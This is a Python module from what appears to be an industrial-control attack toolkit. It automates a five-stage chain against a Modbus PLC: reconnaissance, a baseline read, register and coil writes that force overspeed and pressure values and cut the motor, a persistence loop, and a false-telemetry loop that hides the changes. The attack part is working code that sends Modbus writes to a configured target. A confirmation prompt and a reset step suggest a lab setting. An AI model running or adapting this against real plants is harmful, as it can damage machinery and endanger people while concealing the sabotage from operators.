import time
import threading
from pymodbus.client import ModbusTcpClient
from scripts.config import get, REGISTERS
from scripts import recon, read_plc
from scripts.persist import _loop as persist_loop, _stop as persist_stop
from scripts.cover import _loop as cover_loop, _stop as cover_stop
from utils.colors import ok, err, info, warn, red, yellow, cyan, white, magenta
from utils import logger

STAGE = {
    'name': 'Auto Chain',
    'key':  'a',
    'desc': 'run full attack chain automatically with timed delays',
}

BANNER = f"""
{red("  ╔══════════════════════════════════════╗")}
{red("  ║")} {white("AUTO CHAIN -- FULL ATTACK SEQUENCE     ")}{red("║")}
{red("  ╚══════════════════════════════════════╝")}
"""

ATTACK = REGISTERS['attack']


def _separator(label):
    print()
    print(f"  {cyan('━'*50)}")
    print(f"  {yellow(label)}")
    print(f"  {cyan('━'*50)}")
    print()


def _run_attack(ip, port):
    client = ModbusTcpClient(ip, port=port)
    if not client.connect():
        print(err("Attack connection failed."))
        return

    print(info("Running 3-phase attack automatically..."))
    print()
    print(info("Phase 1: Overspeed..."))
    client.write_register(address=0, value=1410)
    client.write_register(address=1, value=650)
    print(ok("RPM = 1410 Hz, Pressure = 650 mbar"))
    time.sleep(2)

    print(info("Phase 2: Motor cutoff..."))
    for addr, val in ATTACK['coils'].items():
        client.write_coil(address=addr, value=val)
    print(ok("Motor offline. Cascade offline. Alarm triggered."))
    time.sleep(2)

    print(ok("Attack phase complete."))
    logger.attack("Auto chain attack phase complete.")
    client.close()


def _run_timed_loop(loop_fn, stop_event, ip, port, duration, label):
    stop_event.clear()
    t = threading.Thread(target=loop_fn, args=(ip, port), daemon=True)
    t.start()
    try:
        for _ in range(duration):
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        print(info(f"Skipping {label}..."))
    stop_event.set()
    t.join()


def run(cfg=None):
    if cfg is None:
        cfg = get()

    ip   = cfg['target_ip']
    port = cfg['target_port']

    print(BANNER)
    print(info("Auto chain runs all five stages in sequence:"))
    print(info("  Recon -> Read -> Attack -> Persist (30s) -> Cover (30s)"))
    print()
    print(warn("This will alter PLC register values."))
    confirm = input(yellow("  Type YES to start: ")).strip()
    if confirm != 'YES':
        print(info("Aborted."))
        return

    logger.attack(f"Auto chain started against {ip}:{port}")

    _separator("STAGE 1 of 5 -- RECONNAISSANCE")
    time.sleep(1)
    recon.run(cfg)
    time.sleep(3)

    _separator("STAGE 2 of 5 -- READ BASELINE STATE")
    time.sleep(1)
    read_plc.run(cfg)
    time.sleep(3)

    _separator("STAGE 3 of 5 -- EXECUTE ATTACK")
    time.sleep(1)
    _run_attack(ip, port)
    time.sleep(3)

    _separator("STAGE 4 of 5 -- PERSISTENCE (30 seconds)")
    time.sleep(1)
    print(info("Running persistence loop for 30 seconds..."))
    print(warn("Press Ctrl+C to skip to next stage."))
    print()
    _run_timed_loop(persist_loop, persist_stop, ip, port, 30, "persistence")
    time.sleep(2)

    _separator("STAGE 5 of 5 -- FALSE TELEMETRY COVER (30 seconds)")
    time.sleep(1)
    print(info("Running cover loop for 30 seconds..."))
    print(warn("Press Ctrl+C to skip."))
    print()
    _run_timed_loop(cover_loop, cover_stop, ip, port, 30, "cover")

    _separator("AUTO CHAIN COMPLETE")
    print(ok("All five stages executed."))
    print(info("Run stage 2 to confirm final PLC state."))
    print(info("Run Reset to restore normal operating state."))
    print()
    logger.success("Auto chain complete.")
